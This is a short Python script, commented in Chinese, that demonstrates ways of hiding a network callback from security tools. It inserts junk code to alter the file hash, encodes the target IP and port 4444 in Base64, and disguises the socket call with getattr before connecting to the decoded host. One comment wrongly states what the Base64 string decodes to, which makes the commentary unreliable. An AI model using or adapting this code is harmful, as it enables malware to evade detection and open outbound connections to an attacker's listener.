import socket
import base64

# 加入大量的垃圾代碼 (Junk Code) 用於改變 Hash 並干擾分析
def initial_check():
    _x = 10 * 2
    return "System ready"

# 使用 Base64 編碼隱藏 IP 與 Port
# MTAuMC4wLjE= 是 10.0.0.1 的 Base64
b_ip = base64.b64decode("MS4xLjEuMQ==").decode()
b_p = int(base64.b64decode("NDQ0NA==").decode())

# 使用 getattr 隱藏 socket.socket 關鍵字
_s = getattr(socket, 'sock' + 'et')
conn = _s(socket.AF_INET, socket.SOCK_STREAM)

print(initial_check())
conn.connect((b_ip, b_p))